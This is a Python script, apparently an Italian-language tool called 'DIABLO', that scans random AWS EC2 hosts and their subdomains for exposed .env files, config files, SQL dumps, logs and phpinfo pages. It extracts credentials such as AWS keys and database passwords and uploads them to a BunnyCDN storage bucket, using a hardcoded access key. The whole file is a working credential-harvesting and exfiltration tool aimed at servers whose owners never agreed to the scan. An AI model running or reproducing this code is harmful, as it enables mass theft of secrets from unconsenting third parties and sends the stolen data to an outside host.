import os
import sys
import re
import json
import hashlib
import string
import random
import ipaddress
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Gevent monkey patch DEVE essere il primissimo import prima di requests/grequests
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool

from urllib.parse import urlparse
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import grequests
from itertools import islice

requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

class TeeLogger:
    def __init__(self, filepath):
        self.terminal = sys.stdout
        self.logfile = open(filepath, 'a', encoding='utf-8')
        self.at_newline = True

    def _ts(self):
        return time.strftime('%H:%M:%S', time.localtime())

    def write(self, message):
        if message and self.at_newline and not message.startswith('\r'):
            ts = f"[{self._ts()}] "
            self.terminal.write(ts)
            self.logfile.write(ts)
        self.terminal.write(message)
        self.logfile.write(message)
        self.at_newline = message.endswith('\n')

    def flush(self):
        self.terminal.flush()
        self.logfile.flush()

    def close(self):
        self.logfile.close()

LOGS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
LOG_FILE = None
LOG_PATH = None
LOG_UPLOAD_INTERVAL = 300

BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"

RANDOM_SEED = 42
DNS_WORKERS_EC2 = 100
DNS_TIMEOUT_EC2 = 3
HOSTNAME_CHUNK = 500
MAX_IPS_PER_CIDR = 50000

TOTAL_SLOTS = 50000

_CONTAINER_NAME = os.environ.get('HOSTNAME', str(random.getrandbits(64)))
_SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS

def upload_file_to_bunny(local_path, remote_path, max_retries=3):
    headers = {"AccessKey": BUNNY_API_KEY}
    url = f"{BUNNY_STORAGE_URL}/{remote_path}"
    last_error = None
    for attempt in range(max_retries):
        try:
            print(f"[BUNNY UPLOAD] Invio file {local_path} verso {remote_path} (tentativo {attempt+1}/{max_retries})...", flush=True)
            with open(local_path, "rb") as f:
                res = requests.put(url, headers=headers, data=f, timeout=30)
            if res.status_code in [200, 201]:
                print(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}", flush=True)
                return True
            elif res.status_code == 429:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] ⏳ Rate limited (429), retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = f"429 Rate Limited"
            elif res.status_code >= 500:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] ⏳ Server error {res.status_code}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = f"Status {res.status_code} - {res.text}"
            else:
                print(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
                return False
        except Exception as e:
            last_error = str(e)
            if attempt < max_retries - 1:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] ⚠️ Eccezione upload {remote_path}: {e}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
            else:
                print(f"[BUNNY UPLOAD] ❌ Upload FALLITO definitivamente {remote_path}: {e}", flush=True)
    if last_error:
        with open(os.path.join('risultati', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
            f.write(f"Error uploading to Bunny Storage ({remote_path}): {last_error}\n")
    return False

def upload_log_to_bunny():
    if not LOG_PATH or not os.path.exists(LOG_PATH):
        return
    remote = f"logs/{os.path.basename(LOG_PATH)}"
    upload_file_to_bunny(LOG_PATH, remote, max_retries=1)

def load_config():
    try:
        with open('pack.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

config = load_config()
keyword_regexenv = config.get('APP_REGEX_ENV_SHELL', [])
file_envscan = list(dict.fromkeys(config.get('file_env_shellscan', [])))
file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))

result_dir = 'risultati'
newpathtextract = os.path.join(result_dir, 'DIABLO_FILES_SPLIT')

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def generate_list_env_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_envscan), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in file_envscan[i:i + 100]]

def generate_list_phpprofile_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_phpprofile), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 100]]

def chunked_hosts_multi(file_found, chunk_size=50):
    seen = set()
    unique = []
    try:
        with open(file_found, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url and url not in seen:
                    seen.add(url)
                    unique.append(url)
    except:
        return
    it = iter(unique)
    while True:
        chunk = list(islice(it, chunk_size))
        if not chunk:
            break
        yield chunk

def content_diablo_resp(req):
    if sys.version_info[0] < 3:
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def clean_subdomain(sub, domain):
    sub = sub.lower().strip()
    if sub.startswith('*.'):
        sub = sub[2:]
    if sub.startswith('www.'):
        sub = sub[4:]
    return sub

def get_initial_url(url):
    if url.startswith('http://') or url.startswith('https://'):
        return url
    if url.endswith(':443'):
        return f"https://{url}"
    if url.endswith(':80'):
        return f"http://{url}"
    return f"http://{url}"

def get_retry_url(url):
    if url.startswith('http://'):
        return url.replace('http://', 'https://', 1)
    if url.startswith('https://'):
        return url.replace('https://', 'http://', 1)
    if url.endswith(':443') or url.endswith(':80'):
        return None
    return f"https://{url}"

def reverse_ip_lookup(ip):
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            result = response.text.strip()
            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
                return None
            else:
                aweee = []
                domains = result.split('\n')
                for d in domains:
                    if d.startswith("www."):
                        d = d[4:]
                    aweee.append(d)
                return aweee
    except:
        pass
    return None

def find_subdomains(domain):
    subdomains = set()
    try:
        url_ht = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        res_ht = requests.get(url_ht, timeout=10)
        if res_ht.status_code == 200 and "error" not in res_ht.text.lower():
            lines = res_ht.text.strip().split('\n')
            for line in lines:
                sub = line.split(',')[0]
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except:
        pass

    try:
        url_otx = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        res_otx = requests.get(url_otx, timeout=10)
        if res_otx.status_code == 200:
            data = res_otx.json()
            for entry in data.get('passive_dns', []):
                sub = entry.get('hostname', '')
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except:
        pass

    try:
        url_crt = f"https://crt.sh/?q=%.{domain}&output=json"
        res_crt = requests.get(url_crt, timeout=15)
        if res_crt.status_code == 200:
            data = res_crt.json()
            for entry in data:
                name = entry.get('name_value', '')
                clean_names = name.split('\n')
                for cn in clean_names:
                    cn = clean_subdomain(cn, domain)
                    if cn.endswith(domain) and cn != domain:
                        subdomains.add(cn)
    except:
        pass

    if subdomains:
        aweee = []
        for sub in sorted(subdomains):
            if sub.startswith("www."):
                sub = sub[4:]
            aweee.append(sub)
        return aweee
    return None

def process_urls(urls_list, is_fallback=False):
    it = iter(urls_list)
    print(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
    while True:
        chunk = list(islice(it, 100))
        if not chunk:
            break
        
        print(f"[SCANNER] Controllo blocco di {len(chunk)} URL...", flush=True)
        try:
            resp_site = [
                grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in chunk
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            retry_urls = []
            for i, r in enumerate(merdb):
                if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206]):
                    retry_u = get_retry_url(chunk[i])
                    if retry_u:
                        retry_urls.append(retry_u)
                        
            if retry_urls:
                print(f"[SCANNER] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
            resp_retry = [
                grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in retry_urls
            ]
            retry_responses = grequests.map(resp_retry)
            for r in retry_responses:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            site_pool = Pool(50)
            jobs = []
            for site_link, site_payloads in hosts_by_site.items():
                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
            site_pool.join()
            
            del hosts_by_site
            del jobs
                
        except Exception as e:
            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                f.write(str(e) + '\n')

def _scan_site(site_link, site_payloads, is_fallback=False):
    try:
        found_env_urls = []
        found_php_urls = []
        checked = 0
        checkeds = 0
        wildcard_strike_count = 0
        fake_for_site = False
        found_for_site = False
        headers_scout = dict(headers)
        
        env_batches = site_payloads.get('env', [])
        for batch in env_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
            merdb = grequests.map(reqss)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checked += 1
                    try:
                        content = r.content
                        content_lower = content.lower()
                        if b'<pre' in content_lower and b'</pre>' in content_lower:
                            fake_for_site = True
                            r.close()
                            break
                        if b"popbox.fun" in content_lower:
                            fake_for_site = True
                            r.close()
                            break
                        head = content[:100]
                        if b'<html' not in head.lower() and b'<!doctype' not in head.lower() and b'<body' not in head.lower():
                            found_env_urls.append(r.url)
                        r.close()
                    except: pass
                if r: r.close()
            if checked >= 10 or fake_for_site: return
            
        php_batches = site_payloads.get('php', [])
        for batch in php_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
            merdb = grequests.map(reqss)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checkeds += 1
                    found_php_urls.append(r.url)
                if r: r.close()
            if checkeds >= 10: return
            
        urls_to_analyze = found_env_urls + found_php_urls
        if not urls_to_analyze: return
        
        seen_content_hashes = set()
        headers_file_probe = dict(headers)
        headers_file_probe['Range'] = 'bytes=0-4096'
        
        findfile_requests = []
        for url in urls_to_analyze:
            url_lower_check = url.lower()
            is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
            if is_static:
                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
            else:
                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
            findfile_requests.append(req)
            
        responsesf = grequests.map(findfile_requests)
        unique_responses = {}
        for r in responsesf:
            if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                if r.url not in unique_responses:
                    try:
                        content = r.content
                        url_lower = r.url.lower()
                        content_len = len(content)
                        if content_len < 10 or content_len > 1000000:
                            r.close()
                            continue
                        is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
                        is_debug_page = False
                        if is_html_doc:
                            content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
                            debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
                            if any(k in content_str_head for k in debug_keywords):
                                is_debug_page = True
                        if is_html_doc and not is_debug_page:
                            r.close()
                            continue
                        
                        if b'.env' in url_lower.encode() or any(x in url_lower for x in ['.local', '.remote', '.production', 'config', 'credentials']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.json'):
                            stripped = content.strip()
                            if not (stripped.startswith(b'{') or stripped.startswith(b'[')):
                                r.close()
                                continue
                        elif url_lower.endswith('.xml'):
                            if b'<?xml' not in content[:50] and b'<' not in content[:10]:
                                r.close()
                                continue
                        elif any(url_lower.endswith(x) for x in ['.yml', '.yaml', '.ini', '.conf']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.sql'):
                            content_upper = content[:1000].upper()
                            sql_keys = [b'INSERT INTO', b'CREATE TABLE', b'VALUES', b'SELECT', b'DROP TABLE', b'--']
                            if not any(k in content_upper for k in sql_keys):
                                r.close()
                                continue
                        elif url_lower.endswith('.js'):
                            js_secrets = [b'api_key', b'apikey', b'secret', b'token', b'password', b'credential', b'auth', b'bearer', b'db_']
                            if not any(k in content.lower() for k in js_secrets):
                                r.close()
                                continue
                        elif url_lower.endswith('.log'):
                            log_keys = [b'[202', b'[error]', b'[info]', b'[debug]', b'[warning]']
                            if not any(k in content.lower() for k in log_keys):
                                r.close()
                                continue
                                
                        content_hash = hashlib.md5(content).hexdigest()
                        if content_hash in seen_content_hashes:
                            wildcard_strike_count += 1
                            r.close()
                            if wildcard_strike_count >= 5:
                                fake_for_site = True
                                break
                            continue
                        seen_content_hashes.add(content_hash)
                        unique_responses[r.url] = r
                    except:
                        r.close()
                else: r.close()
            else:
                if r: r.close()
                
        if fake_for_site: return
        
        valid_responzzz = list(unique_responses.values())
        if valid_responzzz:
            for r in valid_responzzz:
                if r is None: continue
                try:
                    contentsx = content_diablo_resp(r)
                except:
                    r.close()
                    continue
                response_url = r.url
                
                url_lower = response_url.lower()
                is_env_file = any(x in url_lower for x in ['.env', '.ini', '.conf', 'config', '.txt', '.local', '.remote', '.production', '.yml', '.yaml', '.bak', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
                is_json_file = url_lower.endswith('.json')
                is_php_file = any(x in url_lower for x in ['.php', 'phpinfo', 'view', '_profiler', 'info', '.cgi', '.sh', '.py', '.rb'])
                is_html_content = "<html>" in contentsx.lower() or "<!doctype" in contentsx.lower()
                
                regex_found = False
                for pattern in keyword_regexenv:
                    if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
                    if "PHP Version" in pattern and is_env_file: continue
                    is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                    if is_regex: regex_pattern = pattern
                    else:
                        escaped = re.escape(pattern)
                        start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                        end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                        regex_pattern = f"{start_b}{escaped}{end_b}"
                    
                    for match in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
                        found_for_site = True
                        regex_found = True
                        break
                    if regex_found: break
                    
                if regex_found:
                    if not is_html_content:
                        print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                        
                        saved_file_path = None
                        remote_subpath = None
                        
                        if is_json_file:
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_JSON_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JSON_{rnd_suffix}.txt"
                        elif is_env_file:
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
                        elif url_lower.endswith('.js'):
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_JS_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JS_{rnd_suffix}.txt"
                        elif url_lower.endswith('.xml'):
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_XML_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_XML_{rnd_suffix}.txt"
                        elif url_lower.endswith('.log'):
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_LOG_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_LOG_{rnd_suffix}.txt"
                        elif url_lower.endswith('.sql'):
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_SQL_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_SQL_{rnd_suffix}.txt"
                        else:
                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_OTHER_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_OTHER_{rnd_suffix}.txt"
                            
                        if saved_file_path and remote_subpath:
                            upload_file_to_bunny(saved_file_path, remote_subpath)
                            
                    try:
                        html_content = r.text
                        soup = BeautifulSoup(html_content, "html.parser")
                        h2_tag = soup.find("h2", string="PHP Variables")
                        if h2_tag:
                            table = h2_tag.find_next("table")
                            if table:
                                rows = table.find_all("tr")
                                formatted_output = ""
                                for row in rows:
                                    cols = row.find_all("td")
                                    if len(cols) >= 2:
                                        var_name = cols[0].get_text(strip=True)
                                        var_value = cols[1].get_text(strip=True)
                                        match = re.search(r"\['([^']+)'\]", var_name)
                                        if match:
                                            clean_key = match.group(1)
                                            formatted_output += f"{clean_key} \t {var_value}\n"
                                if formatted_output:
                                    print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
                                    rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                                    
                                    saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
                                    with open(saved_php_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                    
                                    upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
                    except: pass
                try: r.close()
                except: pass
                
                if fake_for_site or found_for_site: break
                
        if found_for_site and not is_fallback:
            hostxxx = urlparse(site_link).hostname
            if hostxxx and hostxxx.startswith("www."):
                hostxxx = hostxxx[4:]
            
            is_ip_addr = False
            try:
                ipaddress.ip_address(hostxxx)
                is_ip_addr = True
            except:
                pass
            
            if not is_ip_addr and hostxxx:
                parts = hostxxx.split(".")
                if len(parts) > 2:
                    target = ".".join(parts[-2:])
                else:
                    target = hostxxx
                
                cazzuno = find_subdomains(target)
                if cazzuno:
                    process_urls(cazzuno, is_fallback=True)
                else:
                    cazzuno = reverse_ip_lookup(hostxxx)
                    if cazzuno:
                        process_urls(cazzuno, is_fallback=True)
            elif hostxxx:
                cazzuno = reverse_ip_lookup(hostxxx)
                if cazzuno:
                    process_urls(cazzuno, is_fallback=True)
                
    except Exception as e:
        with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')

def process_file(file_path):
    file_name = os.path.basename(file_path)
    print(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_name}", flush=True)
    for cameras in chunked_hosts_multi(file_path, chunk_size=100):
        print(f"[SCANNER] Controllo blocco di {len(cameras)} host dal file {file_name}...", flush=True)
        try:
            resp_site = [
                grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in cameras
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            retry_urls = []
            for i, r in enumerate(merdb):
                if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206]):
                    retry_u = get_retry_url(cameras[i])
                    if retry_u:
                        retry_urls.append(retry_u)
                        
            if retry_urls:
                print(f"[SCANNER] Retry su {len(retry_urls)} host in HTTPS...", flush=True)
            resp_retry = [
                grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in retry_urls
            ]
            retry_responses = grequests.map(resp_retry)
            for r in retry_responses:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            site_pool = Pool(50)
            jobs = []
            for site_link, site_payloads in hosts_by_site.items():
                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads))
            site_pool.join()
            
            # Pulisco la memoria del blocco
            del hosts_by_site
            del jobs
                
        except Exception as e:
            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                f.write(str(e) + '\n')
                
    # Alla fine della scansione di questo file, lo elimino in locale
    print(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_name}", flush=True)
    try:
        os.remove(file_path)
        print(f"[SYSTEM] File locale eliminato: {file_path}", flush=True)
    except Exception as e:
        print(f"[SYSTEM] Errore eliminazione locale {file_path}: {e}", flush=True)

def fetch_aws_ips():
    url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
    print("[AWS FETCH] Scaricamento dati IP ranges da AWS...", flush=True)
    resp = requests.get(url, timeout=30)
    resp.raise_for_status()
    return resp.json()

def get_ec2_cidrs(data):
    cidrs = []
    for p in data["prefixes"]:
        if p["service"] == "EC2":
            cidrs.append((p["ip_prefix"], p["region"]))
    return cidrs

def build_deterministic_ip_pool(cidrs_with_regions):
    rng = random.Random(RANDOM_SEED)
    rng.shuffle(cidrs_with_regions)

    regions_set = set(r for _, r in cidrs_with_regions)
    print(f"[AWS POOL] {len(cidrs_with_regions)} CIDR in {len(regions_set)} regioni "
          f"(max {MAX_IPS_PER_CIDR:,} IP/CIDR, seed={RANDOM_SEED})", flush=True)

    sources = []
    for cidr, region in cidrs_with_regions:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            total = net.num_addresses
            if total > MAX_IPS_PER_CIDR:
                offsets = rng.sample(range(total), MAX_IPS_PER_CIDR)
            else:
                offsets = list(range(total))
                rng.shuffle(offsets)
            first = int(net.network_address)
            sources.append([first, offsets, region, 0])
        except Exception:
            pass

    result = []
    active_indices = list(range(len(sources)))
    rng.shuffle(active_indices)

    while active_indices:
        next_indices = []
        for idx in active_indices:
            first, offsets, region, pos = sources[idx]
            if pos < len(offsets):
                ip_int = first + offsets[pos]
                ip = str(ipaddress.ip_address(ip_int))
                result.append((ip, region))
                sources[idx][3] = pos + 1
                next_indices.append(idx)
        active_indices = next_indices

    print(f"[AWS POOL] Pool costruito: {len(result):,} IP totali, "
          f"~{len(result) // TOTAL_SLOTS:,} per slot", flush=True)
    return result

def resolve_ec2_url(ip, region):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        hostname = hostname.lower()
        if "compute.amazonaws.com" in hostname:
            return f"http://{hostname}"
    except Exception:
        pass
    return None

def url_generator(ip_pool, instance_id, total_slots):
    total_for_instance = len(ip_pool) // total_slots
    print(f"[AWS SCAN] Istanza ID={instance_id} (slot 0-{total_slots-1}), "
          f"~{total_for_instance:,} IP da risolvere (loop infinito)", flush=True)

    buffer_urls = []
    cycle = 0

    while True:
        cycle += 1
        chunk = []
        processed = 0
        cycle_hits = 0
        seen_urls = set()

        for i, (ip, region) in enumerate(ip_pool):
            if i % total_slots != instance_id:
                continue
            chunk.append((ip, region))
            processed += 1

            if len(chunk) >= DNS_WORKERS_EC2:
                with ThreadPoolExecutor(max_workers=DNS_WORKERS_EC2) as executor:
                    futures = {executor.submit(resolve_ec2_url, ip, region): (ip, region)
                              for ip, region in chunk}
                    for future in as_completed(futures):
                        try:
                            url = future.result(timeout=DNS_TIMEOUT_EC2 + 1)
                        except Exception:
                            continue
                        if url and url not in seen_urls:
                            seen_urls.add(url)
                            buffer_urls.append(url)
                            cycle_hits += 1
                chunk = []

                while len(buffer_urls) >= HOSTNAME_CHUNK:
                    batch = buffer_urls[:HOSTNAME_CHUNK]
                    buffer_urls = buffer_urls[HOSTNAME_CHUNK:]
                    print(f"[AWS SCAN] Batch pronto: {len(batch)} URL (ciclo {cycle}, "
                          f"processati {processed:,}/{total_for_instance:,} IP, "
                          f"hit {cycle_hits} in questo ciclo)", flush=True)
                    yield batch

                if processed % 5000 == 0:
                    print(f"[AWS SCAN] Progresso: {processed:,} IP risolti, "
                          f"{len(buffer_urls)} URL in buffer", flush=True)

        if chunk:
            with ThreadPoolExecutor(max_workers=min(DNS_WORKERS_EC2, len(chunk))) as executor:
                futures = {executor.submit(resolve_ec2_url, ip, region): (ip, region)
                          for ip, region in chunk}
                for future in as_completed(futures):
                    try:
                        url = future.result(timeout=DNS_TIMEOUT_EC2 + 1)
                    except Exception:
                        continue
                    if url and url not in seen_urls:
                        seen_urls.add(url)
                        buffer_urls.append(url)
                        cycle_hits += 1

        while len(buffer_urls) >= HOSTNAME_CHUNK:
            batch = buffer_urls[:HOSTNAME_CHUNK]
            buffer_urls = buffer_urls[HOSTNAME_CHUNK:]
            yield batch

        print(f"[AWS SCAN] Ciclo #{cycle} completato. {cycle_hits} URL risolti, "
              f"{len(buffer_urls)} in buffer, processati {processed:,} IP.", flush=True)

def main():
    global LOG_PATH

    os.makedirs(LOGS_DIR, exist_ok=True)
    container_id = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
    LOG_PATH = os.path.join(LOGS_DIR, f'{container_id}.log')
    sys.stdout = TeeLogger(LOG_PATH)

    print("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO in modalità CLOUD WORKER...", flush=True)
    print(f"[SYSTEM] Log salvato in: {LOG_PATH}", flush=True)
    os.makedirs(result_dir, exist_ok=True)
    os.makedirs(newpathtextract, exist_ok=True)

    print(f"[SYSTEM] Istanza auto-ID={INSTANCE_ID} (slot 0-{TOTAL_SLOTS-1}) — loop infinito", flush=True)

    aws_data = fetch_aws_ips()
    ec2_cidrs = get_ec2_cidrs(aws_data)

    if not ec2_cidrs:
        print("[SYSTEM] Nessun CIDR EC2 trovato. Uscita.", flush=True)
        return

    print(f"[SYSTEM] Trovati {len(ec2_cidrs)} CIDR EC2. Costruzione pool deterministico...", flush=True)
    ip_pool = build_deterministic_ip_pool(ec2_cidrs)

    gen = url_generator(ip_pool, INSTANCE_ID, TOTAL_SLOTS)
    batch_num = 0
    last_log_upload = time.time()
    for batch in gen:
        batch_num += 1
        print(f"\n[SYSTEM] Batch #{batch_num}: {len(batch)} URL verificati → scansione diretta", flush=True)
        process_urls(batch)
        print(f"[SYSTEM] Batch #{batch_num} completato.", flush=True)

        if time.time() - last_log_upload > LOG_UPLOAD_INTERVAL:
            print("[SYSTEM] Upload log su Bunny Storage...", flush=True)
            upload_log_to_bunny()
            last_log_upload = time.time()

if __name__ == '__main__':
    main()
